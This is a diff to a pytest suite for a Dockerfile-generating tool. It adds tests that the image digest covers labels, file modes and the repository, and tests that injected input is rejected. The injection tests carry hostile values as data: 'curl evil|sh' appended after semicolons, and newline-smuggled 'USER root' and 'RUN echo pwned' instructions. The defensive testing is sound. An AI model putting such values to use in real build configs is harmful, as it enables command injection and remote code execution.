@@ -85,12 +85,22 @@ class TestCompose:
         assert "dev.jormungandr.managed=true" in result.dockerfile
         assert "dev.jormungandr.modules=apt" in result.dockerfile
 
-    def test_stamping_the_digest_does_not_change_the_digest(self) -> None:
+    def test_digest_label_is_excluded_from_the_hash(self) -> None:
         # The LABEL carrying the digest is appended after hashing; if it were
         # hashed the value would be self-referential and never stabilise.
+        # Asserting only "the digest appears in the file" is vacuous — it holds
+        # either way. Hashing the *final* text must give a different answer,
+        # which is only true if the label really was excluded.
+        from jormungandr.runtime.identity import content_digest
+
         result = compose(spec())
         assert result.digest in result.dockerfile
-        assert result.tag == result.digest
+        rehashed = content_digest(
+            dockerfile=result.dockerfile,
+            context_files=result.context_files,
+            context_modes=result.context_modes,
+        )
+        assert rehashed != result.digest, "digest label leaked into its own hash"
 
     def test_custom_labels_merge(self) -> None:
         result = compose(spec(labels={"owner": "nejc"}))
@@ -229,3 +239,101 @@ class TestContainerSpec:
         assert container.no_new_privileges
         assert container.cap_drop_all
         assert container.init
+
+
+class TestDigestCoversEverythingThatChangesTheImage:
+    """Regression tests: an input that changes the image must change the tag.
+
+    Anything missed here means a stale image is silently reused.
+    """
+
+    def test_labels_are_in_the_digest(self) -> None:
+        # Labels are rendered into the Dockerfile, so they are part of the
+        # image. Omitting them let two differently-labelled images share a tag,
+        # with the second build skipped and the first image's labels left in
+        # place — breaking the label-based discovery the tool relies on.
+        a = compose(spec(labels={"experiment": "run-A"}))
+        b = compose(spec(labels={"experiment": "run-B"}))
+        assert a.digest != b.digest
+
+    def test_label_order_does_not_matter(self) -> None:
+        a = compose(spec(labels={"x": "1", "y": "2"}))
+        b = compose(spec(labels={"y": "2", "x": "1"}))
+        assert a.digest == b.digest
+
+    def test_context_file_mode_is_in_the_digest(self) -> None:
+        from jormungandr.runtime.identity import content_digest
+
+        a = content_digest(dockerfile="F", context_files={"s": "x"}, context_modes={"s": 0o644})
+        b = content_digest(dockerfile="F", context_files={"s": "x"}, context_modes={"s": 0o755})
+        assert a != b
+
+    def test_repository_change_is_visible_in_the_reference(self) -> None:
+        a = compose(spec(repository="one"))
+        b = compose(spec(repository="two"))
+        assert a.reference != b.reference
+
+
+class TestInjectionResistance:
+    """Module config is interpolated into shell command bodies.
+
+    A newline does not escape a string here — it ends the instruction and
+    starts a new one, so it needs no attacker to corrupt a Dockerfile.
+    """
+
+    def test_newline_in_apt_package_is_rejected(self) -> None:
+        with pytest.raises(ModuleError, match="unsafe"):
+            compose(spec(modules=[{"name": "apt", "packages": ["git\nUSER root"]}]))
+
+    def test_shell_metacharacters_in_apt_package_rejected(self) -> None:
+        with pytest.raises(ModuleError, match="unsafe"):
+            compose(spec(modules=[{"name": "apt", "packages": ["git; curl evil|sh"]}]))
+
+    def test_string_uid_is_rejected(self) -> None:
+        # ModuleDeclaration allows extra fields without type coercion, so YAML
+        # hands the int-annotated uid whatever was written.
+        with pytest.raises(ModuleError, match="uid must be an integer"):
+            compose(spec(modules=[{"name": "workspace", "uid": "0 --groups root; evil"}]))
+
+    def test_injection_via_workspace_user_rejected(self) -> None:
+        with pytest.raises(ModuleError, match="unsafe"):
+            compose(spec(modules=[{"name": "workspace", "user": "a; curl evil|sh"}]))
+
+    def test_version_specifiers_are_quoted_not_rejected(self) -> None:
+        # `langfuse>=3,<4` and `^1.2.3` are legitimate pins; quoting keeps them
+        # intact and inert rather than banning them.
+        result = compose(
+            spec(
+                modules=[
+                    {"name": "python"},
+                    {"name": "langfuse", "version": ">=3,<4"},
+                    {"name": "node"},
+                    {"name": "agent", "harness": "codex", "version": "^1.2.3"},
+                ]
+            )
+        )
+        assert "'langfuse>=3,<4'" in result.dockerfile
+        assert "'@openai/codex@^1.2.3'" in result.dockerfile
+
+    def test_newline_in_version_is_still_rejected(self) -> None:
+        with pytest.raises(ModuleError, match="newline"):
+            compose(
+                spec(
+                    modules=[
+                        {"name": "node"},
+                        {"name": "agent", "harness": "codex", "version": "1\nUSER root"},
+                    ]
+                )
+            )
+
+    def test_newline_in_build_arg_is_rejected(self) -> None:
+        from jormungandr.runtime.layers import DockerfileError
+
+        with pytest.raises(DockerfileError, match="newline"):
+            compose(spec(build_args={"A\nUSER root\nRUN echo pwned": "1"}))
+
+    def test_newline_in_label_is_rejected(self) -> None:
+        from jormungandr.runtime.layers import DockerfileError
+
+        with pytest.raises(DockerfileError, match="newline"):
+            compose(spec(labels={"a": "1\nUSER root"}))
